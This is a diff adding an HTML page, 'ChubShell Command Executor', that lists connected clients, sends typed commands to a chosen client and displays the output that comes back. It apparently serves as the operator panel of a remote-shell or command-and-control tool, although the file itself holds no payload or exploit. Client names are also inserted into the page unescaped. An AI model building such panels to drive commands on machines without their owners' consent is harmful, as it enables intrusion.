@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ChubShell</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background: black;
+            color: #0f0; /* Neon green */
+            overflow: hidden;
+        }
+
+        h1 {
+            color: #0f0;
+            text-align: center;
+            margin-top: 20px;
+            font-size: 2em;
+            text-shadow: 0 0 10px #0f0;
+        }
+
+        .btn {
+            border: 1px solid #0f0;
+            background: black;
+            color: #0f0;
+        }
+
+        .btn:hover {
+            background-color: #00ff00;
+            color: black;
+            border-color: #00ff00;
+        }
+
+        .output-container {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #0f0;
+            background-color: black;
+            color: #0f0;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        .list-group-item.active {
+            background-color: #00ff00;
+            color: black;
+        }
+
+        .glitch {
+            position: relative;
+            font-size: 2em;
+            text-shadow: 0 0 5px #0f0, 0 0 10px #0f0, 0 0 15px #0f0;
+            animation: glitch 1s infinite;
+        }
+
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            25% { transform: translate(-2px, -2px); }
+            50% { transform: translate(2px, 2px); }
+            75% { transform: translate(-2px, 2px); }
+            100% { transform: translate(2px, -2px); }
+        }
+    </style>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+</head>
+
+<body>
+
+    <div class="container">
+        <h1 class="glitch" data-text="ChubShell Command Executor">ChubShell Command Executor</h1>
+
+        <div class="row">
+            <div class="col-md-3">
+                <h2>Clients</h2>
+                <ul id="clientList" class="list-group">
+                    <!-- Client list items will be added here dynamically -->
+                </ul>
+            </div>
+            <div class="col-md-9">
+                <div class="form-group">
+                    <input type="text" id="commandInput" class="form-control" placeholder="Enter your command here...">
+                </div>
+                <button id="sendButton" class="btn btn-outline-success">Execute</button>
+
+                <div id="output" class="output-container">
+                    <!-- Command and output will be displayed here -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        $(document).ready(function () {
+            let selectedClient = null;
+
+            function fetchClients() {
+                $.get('/clients', function (data) {
+                    const $clientList = $('#clientList');
+                    $clientList.empty();
+                    $.each(data.clients, function (index, client) {
+                        $clientList.append(`<li class="list-group-item client-item" data-client="${client}">${client}</li>`);
+                    });
+                });
+            }
+
+            function fetchReceivedData(clientAddress) {
+                $.get(`/received_data/${encodeURIComponent(clientAddress)}`, function (data) {
+                    const $outputDiv = $('#output');
+                    const outputText = data.sent_commands.map((cmd, index) => `> ${cmd}\n${data.received_data[index] || ''}`).join('\n');
+                    $outputDiv.text(outputText);
+                    $outputDiv.scrollTop($outputDiv[0].scrollHeight);
+                });
+            }
+
+            function sendCommand(command, clientAddress) {
+                $.ajax({
+                    url: '/command',
+                    method: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({ command: command, client_address: clientAddress }),
+                    success: function (data) {
+                        if (data.error) {
+                            $('#output').append(`\nError: ${data.error}`);
+                        } else {
+                            fetchReceivedData(clientAddress);
+                        }
+                    },
+                    error: function (xhr, status, error) {
+                        $('#output').append(`\nFailed to execute command: ${error}`);
+                    }
+                });
+            }
+
+            $('#clientList').on('click', '.client-item', function () {
+                $('.client-item').removeClass('active');
+                $(this).addClass('active');
+                selectedClient = $(this).data('client');
+                if (selectedClient) {
+                    fetchReceivedData(selectedClient);
+                }
+            });
+
+            $('#sendButton').click(function () {
+                const command = $('#commandInput').val().trim();
+                if (!command) {
+                    alert('Please enter a command.');
+                    return;
+                }
+                if (!selectedClient) {
+                    alert('Please select a client.');
+                    return;
+                }
+                
+                sendCommand(command, selectedClient);
+                $("#commandInput").val("");
+            });
+
+            fetchClients();
+        });
+    </script>
+
+</body>
+
+</html>
